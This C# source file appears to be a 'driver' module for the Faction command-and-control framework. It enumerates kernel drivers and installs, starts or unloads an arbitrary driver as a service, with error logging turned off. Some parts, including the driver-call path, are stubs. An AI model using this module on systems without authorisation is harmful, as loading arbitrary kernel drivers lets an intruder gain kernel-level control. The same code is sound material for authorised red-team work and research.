using Faction.Modules.Dotnet.Common;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace Faction.Modules.Dotnet.Commands
{
    class Driver : Command
    {
        [Flags]
        public enum SERVICE_CONTROL : uint
        {
            STOP = 0x00000001,
            PAUSE = 0x00000002,
            CONTINUE = 0x00000003,
            INTERROGATE = 0x00000004,
            SHUTDOWN = 0x00000005,
            PARAMCHANGE = 0x00000006,
            NETBINDADD = 0x00000007,
            NETBINDREMOVE = 0x00000008,
            NETBINDENABLE = 0x00000009,
            NETBINDDISABLE = 0x0000000A,
            DEVICEEVENT = 0x0000000B,
            HARDWAREPROFILECHANGE = 0x0000000C,
            POWEREVENT = 0x0000000D,
            SESSIONCHANGE = 0x0000000E
        }

        public enum SERVICE_STATE : uint
        {
            SERVICE_STOPPED = 0x00000001,
            SERVICE_START_PENDING = 0x00000002,
            SERVICE_STOP_PENDING = 0x00000003,
            SERVICE_RUNNING = 0x00000004,
            SERVICE_CONTINUE_PENDING = 0x00000005,
            SERVICE_PAUSE_PENDING = 0x00000006,
            SERVICE_PAUSED = 0x00000007
        }

        [Flags]
        public enum SERVICE_ACCEPT : uint
        {
            STOP = 0x00000001,
            PAUSE_CONTINUE = 0x00000002,
            SHUTDOWN = 0x00000004,
            PARAMCHANGE = 0x00000008,
            NETBINDCHANGE = 0x00000010,
            HARDWAREPROFILECHANGE = 0x00000020,
            POWEREVENT = 0x00000040,
            SESSIONCHANGE = 0x00000080,
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SERVICE_STATUS
        {
            public int serviceType;
            public int currentState;
            public int controlsAccepted;
            public int win32ExitCode;
            public int serviceSpecificExitCode;
            public int checkPoint;
            public int waitHint;
        }


        [DllImport("psapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool EnumDeviceDrivers(
            [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.FunctionPtr)] [In][Out] UIntPtr[] ddAddresses,
            UInt32 arraySizeBytes,
            [MarshalAs(UnmanagedType.U4)] out UInt32 bytesNeeded
            );

        [DllImport("psapi.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int GetDeviceDriverFileName(
            UIntPtr ddAddress,
            StringBuilder ddBaseName,
            int baseNameStringSizeChars
        );

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManager", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr OpenSCManager(
            string machineName,
            string databaseName,
            uint dwAccess);

        // http://pinvoke.net/default.aspx/advapi32/CreateService.html
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateService(
            IntPtr hSCManager,
            string lpServiceName,
            string lpDisplayName,
            uint dwDesiredAccess,
            uint dwServiceType,
            uint dwStartType,
            uint dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            string lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool StartService(
            IntPtr hService,
            int dwNumServiceArgs,
            string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr OpenService(
            IntPtr hSCManager,
            string lpServiceName,
            uint dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool ControlService(
            IntPtr hService,
            uint dwControl,
            ref SERVICE_STATUS lpServiceStatus);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteService(
            IntPtr hService);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseServiceHandle(
            IntPtr hSCObject);

        /// <summary>
        /// Enumerates the installed drivers; this is done via the Win32 method as it returns the actual sys files instead of just the service names.
        /// The service controller method -> that can be used to return drivers if you call ServiceController.GetDevices but that does not return
        /// the actual sys file that is associated with the driver; this method does this and is needed if you're looking to load or work with an installed sys
        /// file via createfile and deviceiocontrol
        /// </summary>
        /// <param name="deviceDrivers"></param>
        protected void EnumerateDeviceDrivers(List<string> deviceDrivers)
        {
            bool success;
            UInt32 driverArraySize;
            UInt32 driverArraySizeBytes;
            UIntPtr[] ddAddresses;
            UInt32 driverArrayBytesNeeded;

            // Enumerate the installed drivers to see if this is already present
            // https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-device-drivers-in-the-system

            success = EnumDeviceDrivers(null, 0, out driverArrayBytesNeeded);
            
            if (!success)
            {
                throw new ArgumentException("Call to EnumDeviceDrivers Failed.");
            }
            
            if (driverArrayBytesNeeded == 0)
            {
                throw new ArgumentException("No drivers found on system, possibly caught by a sandbox.");
            }

            driverArraySize = driverArrayBytesNeeded / 4;
            driverArraySizeBytes = driverArrayBytesNeeded;
            ddAddresses = new UIntPtr[driverArraySize];
            success = EnumDeviceDrivers(ddAddresses, driverArraySizeBytes, out driverArrayBytesNeeded);

            if(!success)
            {
                throw new ArgumentException("Call to EnumDeviceDrivers Failed.");
            }

            // Get the Base Name of all device drivers present
            for (int i = 0; i < driverArraySize; i++)
            {
                StringBuilder sb = new StringBuilder(1024);
                int result = GetDeviceDriverFileName(ddAddresses[i], sb, sb.Capacity);
                if (result!=0)
                {
                    deviceDrivers.Add(sb.ToString());
                }
            }
        }

        private void DriverPathValidation(string driverPath)
        {
            if (!File.Exists(driverPath))
            {
                throw new ArgumentException("Invalid driver path for DriverPath parameter.");
            }
        }

        public override string Name { get { return "driver"; } }

        public override CommandOutput Execute(Dictionary<string, string> Parameters = null)
        {
            // Reference information:
            // https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers
            // https://docs.microsoft.com/en-us/windows/win32/psapi/device-driver-information
            // https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea?redirectedfrom=MSDN
            // https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol?redirectedfrom=MSDN

            CommandOutput output = new CommandOutput();
            bool isElevated;
            List<string> deviceDrivers = new List<string>();

            // Check privileges, admin is required to work with drivers for this module
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            if (!isElevated)
            {
                output.Complete = true;
                output.Success = false;
                output.Message = "Insufficent privileges to execute module.";
                return output;
            }
            IntPtr SC_MANAGER = IntPtr.Zero;
            IntPtr SC_SERVICE = IntPtr.Zero;
            try
            {
                string operation = "Enumerate"; //set a default to Enumerate
                string driverPath = string.Empty;
                string method = string.Empty;
                string serviceName = string.Empty;
                operation = Parameters["Operation"];

                switch (operation)
                {
                    case "Enumerate":
                        EnumerateDeviceDrivers(deviceDrivers);
                        output.Message = JsonConvert.SerializeObject(deviceDrivers);
                        output.Success = true;
                        break;
                    case "InstallAndStart":
                        driverPath = Parameters["DriverPath"];
                        serviceName = Parameters["ServiceName"];
                        output.Message = "";
                        // parameter validation
                        if(driverPath == string.Empty)
                        {
                            throw new ArgumentException("DriverPath is empty.");
                        }
                        if (serviceName == string.Empty)
                        {
                            throw new ArgumentException("ServiceName is empty.");
                        }

                        DriverPathValidation(driverPath);

                        SC_MANAGER = OpenSCManager(null, null, 0xF003F);
                        SC_SERVICE = CreateService(
                            SC_MANAGER,
                            serviceName,
                            serviceName,
                            0xF003F, // Service All Access Permission
                            0x00000001, // Kernel Driver
                            0x00000003, // Service Demand Start
                            0x00000000, // Error Control - don't log the error
                            driverPath,
                            null,
                            null,
                            null,
                            null,
                            null
                            );

                        // Next we should set the security for the kernel driver; this is intentionally not done as we do not know all the requirements
                        // This potentially adds a risk if the driver is left present for an extended period of time.
                        if (!StartService(SC_SERVICE, 0, null))
                        {
                            output.Message = "Service failed to start.";
                            output.Success = false;
                        }
                        else
                        {
                            output.Success = true;
                        }
                        break;
                    case "Call":
                        driverPath = Parameters["DriverPath"];
                        method = Parameters["Method"];
                        DriverPathValidation(driverPath);
                        break;
                    case "Unload":
                        serviceName = Parameters["ServiceName"];
                        SC_MANAGER = OpenSCManager(null, null, 0x00001);
                        SC_SERVICE = OpenService(SC_MANAGER, serviceName, 0x0020 | 0x10000);
                        SERVICE_STATUS serviceStatus = new SERVICE_STATUS();
                        ControlService(SC_SERVICE, 0x00000001, ref serviceStatus);
                        if(!DeleteService(SC_SERVICE))
                        {
                            output.Message = "Unable to delete service.";
                            output.Success = false;
                        }
                        break;
                    default:
                        break;
                }
            }
            catch (Exception e)
            {
                output.Message = e.Message;
                output.Success = false;
            }
            finally
            {
                if (SC_SERVICE != IntPtr.Zero)
                {
                    CloseServiceHandle(SC_SERVICE);
                }
                if (SC_MANAGER != IntPtr.Zero)
                {
                    CloseServiceHandle(SC_MANAGER);
                }
            }

            output.Complete = true;
            return output;
        }

        private string LoadAndCallDriver(string driverPath, string action)
        {
            //step 1: make sure that the driver is in C:\\Windows\\System32\\drivers

            string results = "";
            try
            {
                // https://docs.microsoft.com/en-us/windows/win32/fileio/creating-and-opening-files
                IntPtr fileHandle = CreateFile(driverPath, FileAccess.ReadWrite, FileShare.ReadWrite, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero);
            }
            catch (FileNotFoundException ex)
            {
                throw ex;
            }

            return results;
        }

        /// <summary>
        /// Pinvoke Signatures Below, needed to call CreateFileA to load the driver
        /// Needed to then call deviceIOControl to interact with it
        /// https://www.pinvoke.net/default.aspx/kernel32/CreateFile.html
        /// </summary>
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile(
             [MarshalAs(UnmanagedType.LPTStr)] string filename,
             [MarshalAs(UnmanagedType.U4)] FileAccess access,
             [MarshalAs(UnmanagedType.U4)] FileShare share,
             IntPtr securityAttributes, // optional SECURITY_ATTRIBUTES struct or IntPtr.Zero
             [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
             [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes,
             IntPtr templateFile); //ignored on file open

        /// <summary>
        /// https://www.pinvoke.net/default.aspx/kernel32/DeviceIoControl.html
        /// </summary>
        /// <param name="hDevice"></param>
        /// <param name="dwIoControlCode"></param>
        /// <param name="InBuffer"></param>
        /// <param name="nInBufferSize"></param>
        /// <param name="OutBuffer"></param>
        /// <param name="nOutBufferSize"></param>
        /// <param name="pBytesReturned"></param>
        /// <param name="lpOverlapped"></param>
        /// <returns></returns>
        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool DeviceIoControl(
                IntPtr hDevice,
                uint dwIoControlCode,
                ref long InBuffer,
                int nInBufferSize,
                ref long OutBuffer,
                int nOutBufferSize,
                ref int pBytesReturned,
                [In] ref NativeOverlapped lpOverlapped);

    }
}

